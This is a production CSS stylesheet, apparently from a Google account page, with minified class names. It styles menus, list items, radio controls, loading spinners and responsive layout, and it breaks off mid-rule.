.r6B9Fd .VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me .VfPpkd-rymPhb-L8ivfd-fmcmS {
	color: #3c4043
}

.r6B9Fd .VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me .VfPpkd-rymPhb-b9t22c {
	opacity: .38
}

.VfPpkd-xl07Ob-XxIAqe {
	display: none;
	position: absolute;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	max-width: -webkit-calc(100vw - 32px);
	max-width: calc(100vw - 32px);
	max-height: -webkit-calc(100vh - 32px);
	max-height: calc(100vh - 32px);
	margin: 0;
	padding: 0;
	-webkit-transform: scale(1);
	transform: scale(1);
	-webkit-transform-origin: top left;
	transform-origin: top left;
	opacity: 0;
	overflow: auto;
	will-change: transform, opacity;
	z-index: 8;
	-webkit-transition: opacity .03s linear, transform .12s cubic-bezier(0, 0, 0.2, 1);
	transition: opacity .03s linear, transform .12s cubic-bezier(0, 0, 0.2, 1);
	-webkit-box-shadow: 0 5px 5px -3px rgba(0, 0, 0, 0.2), 0 8px 10px 1px rgba(0, 0, 0, 0.14), 0 3px 14px 2px rgba(0, 0, 0, 0.12);
	box-shadow: 0 5px 5px -3px rgba(0, 0, 0, 0.2), 0 8px 10px 1px rgba(0, 0, 0, 0.14), 0 3px 14px 2px rgba(0, 0, 0, 0.12);
	background-color: #fff;
	background-color: var(--mdc-theme-surface, #fff);
	color: #000;
	color: var(--mdc-theme-on-surface, #000);
	-webkit-border-radius: 4px;
	border-radius: 4px;
	transform-origin-left: top left;
	transform-origin-right: top right
}

.VfPpkd-xl07Ob-XxIAqe:focus {
	outline: none
}

.VfPpkd-xl07Ob-XxIAqe-OWXEXe-FNFY6c {
	display: inline-block;
	-webkit-transform: scale(1);
	transform: scale(1);
	opacity: 1
}

.VfPpkd-xl07Ob-XxIAqe-OWXEXe-oT9UPb-FNFY6c {
	display: inline-block;
	-webkit-transform: scale(0.8);
	transform: scale(0.8);
	opacity: 0
}

.VfPpkd-xl07Ob-XxIAqe-OWXEXe-oT9UPb-xTMeO {
	display: inline-block;
	opacity: 0;
	-webkit-transition: opacity .075s linear;
	transition: opacity .075s linear
}

[dir=rtl] .VfPpkd-xl07Ob-XxIAqe,
.VfPpkd-xl07Ob-XxIAqe[dir=rtl] {
	transform-origin-left: top right;
	transform-origin-right: top left
}

.VfPpkd-xl07Ob-XxIAqe-OWXEXe-oYxtQd {
	position: relative;
	overflow: visible
}

.VfPpkd-xl07Ob-XxIAqe-OWXEXe-qbOKL {
	position: fixed
}

.UQ5E0 {
	-webkit-box-shadow: 0 3px 5px -1px rgba(0, 0, 0, 0.2), 0 6px 10px 0 rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12);
	box-shadow: 0 3px 5px -1px rgba(0, 0, 0, 0.2), 0 6px 10px 0 rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12)
}

.VfPpkd-xl07Ob {
	min-width: 112px
}

.VfPpkd-xl07Ob .VfPpkd-rymPhb-IhFlZd,
.VfPpkd-xl07Ob .VfPpkd-rymPhb-f7MjDc {
	color: rgba(0, 0, 0, 0.87)
}

.VfPpkd-xl07Ob .VfPpkd-rymPhb {
	color: rgba(0, 0, 0, 0.87);
	position: relative
}

.VfPpkd-xl07Ob .VfPpkd-rymPhb .VfPpkd-BFbNVe-bF1uUb {
	width: 100%;
	height: 100%;
	top: 0;
	left: 0
}

.VfPpkd-xl07Ob .VfPpkd-rymPhb-clz4Ic {
	margin: 8px 0
}

.VfPpkd-xl07Ob .VfPpkd-rymPhb-ibnC6b {
	-webkit-user-select: none
}

.VfPpkd-xl07Ob .VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me {
	cursor: auto
}

.VfPpkd-xl07Ob a.VfPpkd-rymPhb-ibnC6b .VfPpkd-rymPhb-b9t22c,
.VfPpkd-xl07Ob a.VfPpkd-rymPhb-ibnC6b .VfPpkd-rymPhb-f7MjDc {
	pointer-events: none
}

.VfPpkd-qPzbhe-JNdkSc {
	padding: 0;
	fill: currentColor
}

.VfPpkd-qPzbhe-JNdkSc .VfPpkd-rymPhb-ibnC6b {
	padding-left: 56px;
	padding-right: 16px
}

[dir=rtl] .VfPpkd-qPzbhe-JNdkSc .VfPpkd-rymPhb-ibnC6b,
.VfPpkd-qPzbhe-JNdkSc .VfPpkd-rymPhb-ibnC6b[dir=rtl] {
	padding-left: 16px;
	padding-right: 56px
}

.VfPpkd-qPzbhe-JNdkSc .VfPpkd-qPzbhe-JNdkSc-Bz112c {
	left: 16px;
	right: initial;
	display: none;
	position: absolute;
	top: 50%;
	-webkit-transform: translateY(-50%);
	transform: translateY(-50%)
}

[dir=rtl] .VfPpkd-qPzbhe-JNdkSc .VfPpkd-qPzbhe-JNdkSc-Bz112c,
.VfPpkd-qPzbhe-JNdkSc .VfPpkd-qPzbhe-JNdkSc-Bz112c[dir=rtl] {
	left: initial;
	right: 16px
}

.VfPpkd-xl07Ob-ibnC6b-OWXEXe-gk6SMd .VfPpkd-qPzbhe-JNdkSc-Bz112c {
	display: inline
}

.q6oraf {
	-webkit-box-shadow: 0 3px 5px -1px rgba(0, 0, 0, 0.2), 0 6px 10px 0 rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12);
	box-shadow: 0 3px 5px -1px rgba(0, 0, 0, 0.2), 0 6px 10px 0 rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12)
}

.q6oraf .VfPpkd-rymPhb {
	font-family: Roboto, Arial, sans-serif;
	font-size: 1rem;
	font-weight: 400;
	letter-spacing: .00625em;
	line-height: 1.5rem;
	color: #000;
	color: var(--mdc-theme-on-surface, #000)
}

.q6oraf .VfPpkd-rymPhb .VfPpkd-rymPhb-IhFlZd {
	color: #5f6368
}

.q6oraf .VfPpkd-rymPhb .VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me .VfPpkd-rymPhb-b9t22c,
.q6oraf .VfPpkd-rymPhb .VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me .VfPpkd-rymPhb-fpDzbe-fmcmS,
.q6oraf .VfPpkd-rymPhb .VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me .VfPpkd-rymPhb-L8ivfd-fmcmS {
	color: #3c4043
}

.q6oraf .VfPpkd-rymPhb .VfPpkd-rymPhb-ibnC6b-OWXEXe-OWB6Me .VfPpkd-rymPhb-b9t22c {
	opacity: .38
}

.Rbsaxf {
	position: relative
}

.aeoOpc {
	min-width: 100%
}

.cybYYd .VfPpkd-rymPhb-fpDzbe-fmcmS::before {
	height: initial
}

.ocJfO {
	height: 36px;
	margin-right: 16px;
	width: 36px
}

.n9aNoc {
	-webkit-align-items: center;
	align-items: center;
	-webkit-border-radius: 4px;
	border-radius: 4px;
	border: 1px solid #dadce0;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	cursor: pointer;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	padding: 3px 16px;
	position: relative;
	-webkit-user-select: none
}

.zhimhd {
	border-color: #5f6368 transparent;
	border-style: solid;
	border-width: 5px 5px 0 5px;
	height: 0;
	pointer-events: none;
	position: absolute;
	right: 16px;
	top: 34px;
	width: 0;
	z-index: 1
}

.VfPpkd-BFbNVe-bF1uUb {
	position: absolute;
	-webkit-border-radius: inherit;
	border-radius: inherit;
	opacity: 0;
	pointer-events: none;
	-webkit-transition: opacity 280ms cubic-bezier(0.4, 0, 0.2, 1);
	transition: opacity 280ms cubic-bezier(0.4, 0, 0.2, 1);
	background-color: #fff
}

.NZp2ef {
	background-color: #e8eaed
}

.X8Ezkb {
	background: url('//ssl.gstatic.com/accounts/marc/action_menu.png') no-repeat;
	-webkit-background-size: 10px 20px;
	background-size: 10px 20px;
	display: inline-block;
	height: 20px;
	vertical-align: middle;
	width: 10px
}

.vhx2Fc,
.XywNcf {
	display: inline-block;
	height: 24px;
	vertical-align: bottom;
	width: 24px
}

.Wfnlne .zHQkBf {
	font-family: monospace
}

.nDmuSb,
.nDmuSb .jveIPe {
	background-color: #fff
}

.qracnf {
	cursor: pointer;
	display: block;
	outline: none
}

.qracnf:active,
.qracnf:focus {
	background-color: rgba(0, 0, 0, 0.12);
	border-radius: 2px;
	margin: -6px;
	padding: 6px
}

.QdxRZc {
	float: left;
	height: 44px;
	overflow: hidden;
	width: 36px
}

.nDmuSb .jveIPe {
	border-top: 1px solid #e0e0e0;
	padding-bottom: 0
}

.nDmuSb .jveIPe .tk3N6e-LgbsSe-n2to0e {
	padding-bottom: 12px;
	padding-top: 12px
}

.vJp1Ic {
	background: #fff;
	border: none;
	width: 100%
}

.eiQxF {
	margin: -24px 0 -32px -24px
}

.UkXpOb {
	background: url(//ssl.gstatic.com/accounts/ui/progress_spinner_color_20dp_4x.gif) no-repeat center center;
	-webkit-background-size: 36px;
	background-size: 36px
}

.KVJolf {
	display: none
}

.o2t7Db {
	font-size: 13px
}

.kTg6rc {
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	margin: 1em 0
}

.TYcLG {
	margin-left: 1em
}

.WJliFe,
.TJnJXc {
	margin: 0
}

.ZnT4pc,
.DcNrnd {
	white-space: nowrap
}

.PJcQJc {
	display: inline-block;
	margin: 12px 12px 0 0;
	vertical-align: top
}

.GYzULd {
	color: rgba(0, 0, 0, .89);
	display: inline-block;
	font-size: 12px;
	vertical-align: top;
	width: -webkit-calc(100% - 36px);
	width: calc(100% - 36px)
}

.oGtlyf {
	font-weight: bold;
	margin-bottom: 0
}

.TQXn1 {
	margin-top: 0
}

.LxKb9 {
	margin-bottom: 2em;
	margin-top: 0;
	padding: 0
}

.DWnerb {
	list-style: none;
	margin-top: 10px
}

.jtPOId {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.jtPOId+.jtPOId .iP0MPb {
	border-top: 1px solid #ddd
}

.pwsqJe {
	margin-right: 20px;
	padding-top: 14px;
	width: 24px
}

.iP0MPb {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1
}

.iP0MPb .Ce1Y1c {
	fill: rgba(0, 0, 0, 0.54);
	margin-right: 12px;
	padding: 0
}

.BcLIUc {
	color: rgba(0, 0, 0, 0.54)
}

.BcLIUc :first-child {
	margin-top: 0
}

.IVFYv.u3bW4e .MudrHd {
	background-color: #eeeeee
}

.IVFYv+.IVFYv {
	border-top: 1px solid rgba(0, 0, 0, 0.12)
}

.MudrHd {
	cursor: pointer;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	outline: none;
	padding: 16px 0;
	-webkit-transition: background-color .2s .1s;
	transition: background-color .2s .1s
}

.HQWdkf {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	-webkit-flex-shrink: 1;
	flex-shrink: 1
}

.jxmV5 {
	color: rgba(0, 0, 0, 0.65);
	-webkit-box-flex: 0;
	box-flex: 0;
	-webkit-flex-grow: 0;
	flex-grow: 0;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	padding-left: 16px;
	width: 24px;
	position: relative;
	margin: -2px 0;
	-webkit-user-select: none
}

.HftKaf {
	display: none;
	padding-bottom: 16px
}

.IVFYv.sMVRZe .HftKaf,
.IVFYv.UTOmKf .HftKaf {
	display: block
}

.VI88pd,
.IVFYv.sMVRZe .xYmrVe {
	display: none
}

.IVFYv.sMVRZe .VI88pd,
.xYmrVe {
	display: block
}

.IVFYv.UTOmKf .xYmrVe {
	-webkit-transform: rotate(180deg);
	transform: rotate(180deg)
}

.IVFYv.UTOmKf .VI88pd {
	-webkit-transform: rotate(-180deg);
	transform: rotate(-180deg)
}

.IVFYv.sxlEM .VI88pd,
.IVFYv.sxlEM .xYmrVe {
	-webkit-transition: transform .3s ease-in-out;
	transition: transform .3s ease-in-out;
	-webkit-transform: rotate(0);
	transform: rotate(0)
}

.OXEsod {
	font-style: italic
}

.rXWKJ.eLNT1d {
	display: none
}

.g5yLne {
	font-size: 12px;
	padding-top: 8px;
	line-height: 18px
}

.p0JJ8b {
	width: 100%
}

.e5QWL,
.JGXd4b.wlHooc .p0JJ8b {
	display: none
}

.JGXd4b.wlHooc .e5QWL {
	display: block
}

.sdjHsb.mUbCce {
	height: 24px;
	top: -3px;
	width: 24px
}

.MIWRlb {
	color: rgba(0, 0, 0, 0.65);
	display: inline-block;
	height: 24px;
	margin-left: -12px;
	margin-top: -12px;
	padding: 12px;
	vertical-align: middle;
	width: 24px
}

.SvGfN {
	background-color: white;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	display: none;
	left: 0;
	min-height: 100vh;
	padding: 0 20px 20px 20px;
	position: absolute;
	right: 0;
	top: 0;
	z-index: 100
}

.ddop1d .nQOrEb,
.ddop1d .Id5V1 {
	border-color: #4285f4
}

.sN5Hqb .oyD5Oc {
	border-color: #fff
}

.sN5Hqb.N2RpBe,
.PciPcd.N2RpBe .espmsb,
.ddop1d.N2RpBe .nQOrEb,
.ddop1d.N2RpBe .Id5V1 {
	border-color: #4285f4
}

.sN5Hqb.RDPZE,
.PciPcd.RDPZE .espmsb,
.ddop1d.N2RpBe.RDPZE .nQOrEb,
.ddop1d.RDPZE .Id5V1 {
	border-color: #bdbdbd
}

.PciPcd.N2RpBe>.MLPG7 {
	border-color: rgba(66, 133, 244, 0.502)
}

.PciPcd.i9xfbb>.MbhUzd,
.PciPcd.u3bW4e>.MbhUzd,
.sN5Hqb.i9xfbb>.MbhUzd,
.sN5Hqb.u3bW4e>.MbhUzd,
.ddop1d.i9xfbb>.MbhUzd,
.ddop1d.u3bW4e>.MbhUzd {
	background-color: rgba(66, 133, 244, 0.2)
}

.BfLNsd,
.MbP4A,
.utM3ib {
	display: table
}

.xwm54b {
	padding-right: 16px;
	color: #5f6368
}

.cZ2Dac,
.N1SvPd,
.uhCrL,
.XZs2ib,
.xwm54b,
.wbNize,
.ySYxV {
	display: table-cell;
	vertical-align: top
}

.cZ2Dac,
.uhCrL {
	padding-right: 16px
}

.wbNize {
	padding-left: 16px
}

.N1SvPd,
.XZs2ib,
.ySYxV {
	padding-top: 1px
}

.BfLNsd+.BfLNsd,
.MbP4A+.MbP4A,
.utM3ib+.utM3ib {
	margin-top: 12px
}

.BfLNsd.ehKmY .C2o5O.RDPZE,
.MbP4A.ehKmY .C2o5O.RDPZE,
.utM3ib.ehKmY .C2o5O.RDPZE {
	color: rgba(0, 0, 0, 0.26)
}

.BfLNsd.Jj6Lae .sN5Hqb {
	border-color: #db4437
}

.BfLNsd.Jj6Lae .sN5Hqb>.MbhUzd {
	background-color: rgba(219, 68, 55, 0.2)
}

.DAFGi {
	color: #db4437;
	display: none;
	margin-top: 8px
}

.BfLNsd.Jj6Lae .DAFGi {
	display: block
}

.dJTZVb {
	height: 24px;
	width: 24px
}

.zqc0lb {
	font-weight: bold
}

.Z6HGOe {
	margin: 8px 0 12px 0
}

.Z6HGOe>p {
	margin-top: 0
}

.Kthbd {
	padding: 12px 0
}

.lOP8Qc {
	color: #4285f4;
	font-weight: 500;
	margin: 8px 8px 8px 0;
	padding-top: 24px;
	text-transform: uppercase
}

.lOP8Qc .snByac {
	margin-left: 0
}

.KVmtY {
	display: inline-block
}

.o59HGb {
	display: inline-block;
	margin-top: -6px;
	position: absolute;
	top: 50%
}

.RtEi8b {
	padding-top: 16px
}

.RtEi8b .KcPmZb:focus {
	background-color: rgba(66, 133, 244, .26);
	outline: none
}

.VoGabf {
	margin-top: 32px
}

.eUxbTd.wTcIjd {
	margin-top: 53px
}

.ceKTQe {
	outline: none
}

.wTcIjd .ceKTQe {
	padding-bottom: 48px
}

.ZaFaVe {
	display: none
}

.KcPmZb {
	cursor: pointer;
	border-top: 1px solid rgba(0, 0, 0, 0.12);
	position: relative;
	-webkit-user-select: none
}

.UsyAGd .KcPmZb:first-child {
	border-top-color: rgba(0, 0, 0, 0)
}

.UsyAGd.sd6Lse .KcPmZb:first-child {
	border-top: 1px solid rgba(0, 0, 0, 0.12)
}

.KcPmZb:hover {
	outline: none
}

.wTcIjd.KcPmZb:hover {
	background-color: #f5f5f5;
	border-top: 1px solid #f5f5f5
}

.wTcIjd.KcPmZb:hover+.ZaFaVe+.wTcIjd.KcPmZb {
	border-top: 1px solid #f5f5f5
}

.wTcIjd.KcPmZb:hover+.ZaFaVe+.FFmpFe {
	border-bottom: 1px solid #f5f5f5
}

.mwevgf {
	display: inline-block
}

.wTcIjd .mwevgf {
	margin-right: 80px;
	padding: 24px 0 24px 40px
}

.KiVVqb .mwevgf {
	color: #4285f4;
	font-size: 16px;
	margin-right: 64px;
	padding: 14px 0 20px 24px
}

.STFFwe {
	display: inline-block;
	position: absolute;
	right: 40px;
	top: 50%;
	margin-top: -17px
}

.KiVVqb .STFFwe {
	right: 16px;
	margin-top: -22px
}

.d1eBdb {
	height: 35px;
	width: 35px
}

.qqdRe,
.Cvas5d {
	vertical-align: middle;
	left: 6px;
	position: relative;
	top: 7px
}

.wM25w {
	background-color: #4285f4;
	-webkit-border-radius: 50%;
	border-radius: 50%;
	display: inline-block;
	vertical-align: middle
}

.KiVVqb .wM25w {
	background-color: transparent
}

.wM25w .Cvas5d {
	display: none
}

.nzubyd {
	display: inline-block;
	vertical-align: middle
}

.nzubyd .qqdRe {
	display: none
}

.FFmpFe {
	margin: 0
}

.KiVVqb .FFmpFe {
	display: none
}

@media only screen and (max-device-width:1024px),
only screen and (max-width:768px),
only screen and (max-height:700px) {
	.wTcIjd .mwevgf {
		margin-right: 64px;
		padding: 20px 0 20px 24px
	}
	.wTcIjd .STFFwe {
		right: 24px
	}
}

.O7erEf {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: row-reverse;
	flex-direction: row-reverse;
	width: 100%
}

.RUnmH {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1
}

.xN6LJe {
	text-align: right
}

.OuKFZc {
	text-align: left
}

.eRJVVb {
	border-color: #5f6368;
	-webkit-transform: translatex(-2px) scale(0.8);
	transform: translatex(-2px) scale(0.8)
}

.eRJVVb .fsHoPb {
	border-color: #fff
}

.eRJVVb.N2RpBe {
	border-color: #4285f4
}

.eRJVVb.N2RpBe .oyD5Oc {
	border-color: #fff
}

.eRJVVb.i9xfbb>.MbhUzd {
	background-color: rgba(26, 115, 232, 0.149)
}

.TMiC2 {
	-webkit-box-align: center;
	box-align: center;
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: horizontal;
	box-orient: horizontal;
	-webkit-flex-direction: row;
	flex-direction: row;
	background-color: rgba(0, 0, 0, 0);
	border-top: 1px solid #e8e8e8;
	cursor: pointer;
	margin-bottom: -1px
}

.LAolH .TMiC2 {
	border-bottom: 1px solid #e8e8e8
}

.e36Bs {
	-webkit-box-flex: 0;
	box-flex: 0;
	-webkit-flex-grow: 0;
	flex-grow: 0;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	padding: 0 32px 0 14px
}

.Xo3Ncb .e36Bs {
	fill: #009688
}

.e1rl0b .e36Bs {
	fill: #757575
}

.PXgmmb {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	-webkit-flex-shrink: 1;
	flex-shrink: 1;
	-webkit-flex-basis: 0;
	flex-basis: 0;
	font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	line-height: 24px;
	overflow-x: hidden;
	padding: 12px 0
}

.Xo3Ncb .PXgmmb {
	color: #009688
}

.e1rl0b .PXgmmb {
	color: #212121
}

.d2RaYb {
	-webkit-box-flex: 0;
	box-flex: 0;
	-webkit-flex-grow: 0;
	flex-grow: 0;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	margin: 0;
	padding: 0
}

.u7BLJc,
.KNiIWb {
	fill: rgba(0, 0, 0, 0.54)
}

.LAolH .KNiIWb,
.jGT57b .u7BLJc {
	display: none
}

.xHOYx {
	border-bottom: 1px solid #e8e8e8;
	color: rgba(0, 0, 0, 0.87);
	font: 400 14px/20px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	line-height: 22px;
	padding: 0 16px 16px 16px;
	margin-bottom: -1px
}

.LAolH .xHOYx {
	display: none
}

[dir="rtl"] .nOvqte {
	-webkit-transform: scaleX(-1);
	transform: scaleX(-1)
}

.P3kIjf {
	font-size: 21px;
	font-weight: 500;
	margin: 0;
	padding: 22px 0 0 0
}

.HnY1Zb {
	color: rgba(0, 0, 0, 0.87);
	font: 400 14px/20px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	line-height: 22px
}

.Y04Az {
	font-weight: 500
}

.zIGq8d {
	padding: 16px 16px 0 16px
}

.yxp4vb {
	padding: 8px 16px 20px 16px
}

.alGnMb {
	display: block
}

.ZbmKDb {
	padding: 8px 0
}

.QiS8Wb {
	margin-left: 16px;
	padding-left: 8px
}

.q6vc8b {
	padding: 10px 0 10px 4px
}

.fCC4vb {
	padding: 20px 16px 0
}

.OAeUSb {
	font-style: italic
}

.m6Azde {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-wrap: wrap;
	flex-wrap: wrap;
	-webkit-justify-content: space-between;
	justify-content: space-between
}

.h7xxQe {
	width: 100%
}

.h7xxQe:first-child {
	-webkit-box-ordinal-group: 1;
	-webkit-order: 1;
	order: 1
}

.h7xxQe:nth-child(2) {
	-webkit-box-ordinal-group: 3;
	-webkit-order: 3;
	order: 3
}

.m6Azde .zHQkBf {
	text-align: left
}

.m6Azde .h7xxQe:first-child .uIZQNc {
	padding-top: 16px
}

.OcVpRe .h7xxQe:first-child .uIZQNc {
	padding-top: 24px
}

.m6Azde:first-child .h7xxQe:first-child .uIZQNc {
	padding-top: 8px
}

.OcVpRe.DbQnIe .h7xxQe .uIZQNc {
	padding-top: 24px
}

.m6Azde.DbQnIe .h7xxQe .uIZQNc {
	padding-top: 8px
}

.Wy5Hze {
	font-size: 12px;
	-webkit-box-ordinal-group: 2;
	-webkit-order: 2;
	order: 2;
	width: 100%
}

.XEtdsd {
	-webkit-box-ordinal-group: 4;
	-webkit-order: 4;
	order: 4
}

@media all and (min-width:601px) {
	.m6Azde.DbQnIe .h7xxQe {
		-webkit-box-flex: 1;
		box-flex: 1;
		-webkit-flex-grow: 1;
		flex-grow: 1;
		width: -webkit-calc(50% - 8px);
		width: calc(50% - 8px)
	}
	.m6Azde.DbQnIe .h7xxQe:first-child {
		margin-right: 16px
	}
	.m6Azde.DbQnIe .XEtdsd {
		width: 100%
	}
	.m6Azde.DbQnIe .Wy5Hze {
		-webkit-box-ordinal-group: 5;
		-webkit-order: 5;
		order: 5
	}
}

.jdgG1 {
	border-color: #3367d6
}

.iTvmMc {
	border-color: #c53929
}

.PFCdh {
	margin-top: 64px;
	text-align: center
}

.PFCdh img {
	height: 20px;
	margin-bottom: 8px;
	width: 20px
}

.jz5fxd {
	display: table;
	list-style: none;
	margin: 22px 0 24px;
	padding: 0;
	width: 100%
}

.OhJsq {
	display: table-row
}

.FDjiAd {
	display: table-cell;
	vertical-align: top;
	width: 24px
}

.Q1YFle,
.GvM1Fd {
	height: 24px;
	width: 24px
}

.oNQuZd {
	display: table-cell;
	padding: 3px 24px 21px 24px;
	vertical-align: top
}

.yjmdhc {
	display: table-cell;
	vertical-align: top;
	width: 24px
}

.SApaJ {
	font-size: 12px;
	margin: 0 0 36px 0
}

.SApaJ h2 {
	font-size: 16px;
	line-height: 24px;
	color: #212121
}

.SApaJ p {
	font-size: 14px;
	color: #9e9e9e;
	line-height: 1.4;
	margin-top: 4px
}

.MCz2Tc {
	margin: 0;
	white-space: pre-line
}

.LdF4b .cnD7Xc {
	opacity: .3;
	pointer-events: none
}

.LdF4b .GtglAe {
	margin-top: 0
}

button[type=button].wj7hLb {
	margin-top: 16px
}

.sAyraf {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	font-size: 12px;
	cursor: pointer
}

.diUTJd {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	padding-left: 16px
}

.hEd6he {
	-webkit-transform: translatex(-2px) scale(.8);
	transform: translatex(-2px) scale(.8)
}

.hEd6he.N2RpBe {
	border-color: #4285f4
}

.hEd6he.i9xfbb>.MbhUzd,
.hEd6he.u3bW4e>.MbhUzd {
	background-color: #a1c2fa
}

.sAyraf.Jj6Lae .hEd6he {
	border-color: #d93025
}

.gGSPFb {
	padding-bottom: 0;
	padding-top: 8px;
	color: #d93025;
	display: none
}

.sAyraf.Jj6Lae .gGSPFb {
	display: block
}

.cNPTrc {
	display: none
}

.Hdgkoc {
	color: rgba(0, 0, 0, .54)
}

.Tljtee {
	color: #1a73e8
}

.PleBEc {
	white-space: nowrap
}

.iaNF1e:not(.PHnNib) .YfYrdb,
.iaNF1e.PHnNib .bRlkkc,
.iaNF1e:not(.PHnNib) .tf37qf,
.iaNF1e.PHnNib .OCpkoe,
.iaNF1e:not(.PHnNib) .aHRnrd,
.iaNF1e.PHnNib .lss7tf {
	display: none
}

.ZjBmGc {
	background: #fff9c4;
	-webkit-border-radius: 5px;
	border-radius: 5px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	padding: 16px
}

.CCjY7 {
	padding: 0 16px 0 0
}

.l2eNhe {
	margin: 0
}

.XGiaab {
	font-size: 14px
}

.sdIWsb {
	white-space: nowrap
}

.iCbsld {
	font-size: 12px;
	margin-top: 0
}

.lqByzd {
	-webkit-box-sizing: content-box;
	box-sizing: content-box;
	padding-top: 16px
}

.lqByzd.OcVpRe {
	padding-top: 24px
}

.lqByzd:first-child {
	padding-top: 8px
}

.lqByzd .zHQkBf {
	font-size: 16px
}

.lqByzd .RxsGPe:empty {
	-webkit-flex: none;
	flex: none;
	min-height: 0;
	padding-top: 0
}

.G2JKS {
	width: 100%
}

.lqByzd .r5iSrd.lPGq1c {
	margin-top: 4px
}

.lqByzd.OcVpRe .r5iSrd.lPGq1c {
	height: 34px;
	margin-top: 0
}

.lqByzd .G2JKS .uIZQNc {
	padding-top: 0
}

.PvOHoc {
	white-space: nowrap
}

.FOCaXb {
	background-repeat: no-repeat;
	color: #db4437;
	padding-left: 32px
}

.E8r82b {
	margin-top: 24px
}

.GBIAjf {
	line-height: 18px;
	margin: 18px 0
}

.e77Afe {
	-webkit-border-radius: 9px;
	border-radius: 9px;
	height: 18px;
	vertical-align: middle;
	width: 18px
}

.XRbOB {
	margin-left: 16px;
	vertical-align: middle
}

.KXTluc {
	background-position: 0 3px;
	background-repeat: no-repeat;
	background-attachment: scroll;
	padding-bottom: 11px
}

.KXTluc.cd29Sd {
	padding-left: 48px
}

.RB90md {
	font-weight: 500;
	line-height: 24px;
	margin: 0
}

.Uf38Vc {
	color: rgba(0, 0, 0, .54);
	margin: 0;
	min-height: 25px;
	padding-bottom: 5px
}

.J7QT2b {
	line-height: 24px;
	margin: 0;
	padding-bottom: 5px;
	padding-left: 48px;
	padding-top: 5px
}

.z7UW2d {
	color: rgba(0, 0, 0, .54);
	margin-top: 4px;
	margin-bottom: 0
}

.pN2Hce {
	margin: 15px 0;
	padding-top: 15px
}

.nWoHCc {
	font-weight: 400;
	color: #d93025
}

.CJMEFe {
	font-size: 16px;
	font-weight: 400;
	line-height: 24px
}

.uYaBFd {
	color: #1a73e8
}

.Ps6wZd {
	display: inline-block
}

.NuSjR {
	margin-top: 12px;
	margin-bottom: 32px
}

.ZlWiGc {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	padding-top: 24px;
	padding-bottom: 24px;
	border-bottom: 1px solid #d5d5d5
}

.sfqO1d {
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	border-color: #4285f4
}

.sfqO1d .MbhUzd {
	background-color: rgba(66, 133, 244, 0.2)
}

.sfqO1d .nQOrEb,
.sfqO1d.N2RpBe .Id5V1 {
	border-color: #4285f4
}

.qScoOc {
	margin-left: 24px
}

.AlPGPb {
	padding: 10px 16px;
	background: #fef7e1;
	margin-bottom: 24px;
	-webkit-border-radius: 4px;
	border-radius: 4px
}

.oo1JCe {
	padding-bottom: 0
}

.ak8CFf {
	margin-top: 16px
}

.pN2Hce {
	margin: 15px 0;
	padding-top: 0
}

.ZHcXde {
	display: block;
	margin-left: auto;
	margin-right: auto;
	margin-top: 16px;
	margin-bottom: 24px;
	max-width: 216px;
	width: 100%
}

.RRb7v {
	padding: 16px 16px 0 16px
}

.RRb7v .N1SvPd {
	padding-left: 16px
}

.B3MtBe {
	margin-top: 0
}

.x2LCkd {
	display: none
}

.DdVJAd {
	margin: -16px
}

.hMUM8c {
	margin-left: -4px;
	margin-right: -4px
}

.UYnw1 {
	border-top: 1px solid rgba(0, 0, 0, 0.12);
	padding: 16px 0
}

@media all and (min-width:450px) {
	.hMUM8c {
		margin-left: -24px;
		margin-right: -24px
	}
}

.OFwlad {
	margin: 0 0 10px
}

.UYc1sc {
	display: inline-block
}

.XaBCwd {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	margin-bottom: 24px
}

.EiC2Y {
	-webkit-box-flex: 0 0 auto;
	-webkit-flex: 0 0 auto;
	flex: 0 0 auto;
	margin-right: 24px
}

.EiC2Y.T0hNR {
	margin-top: 10px
}

.qKNYMe {
	display: inline-block;
	-webkit-box-flex: 0 1 100%;
	-webkit-flex: 0 1 100%;
	flex: 0 1 100%
}

.qKNYMe h3,
.qKNYMe p {
	margin: 0
}

.xAP2n {
	max-height: 24px;
	max-width: 24px
}

.KVkcSd {
	background: 0 12px/24px no-repeat scroll;
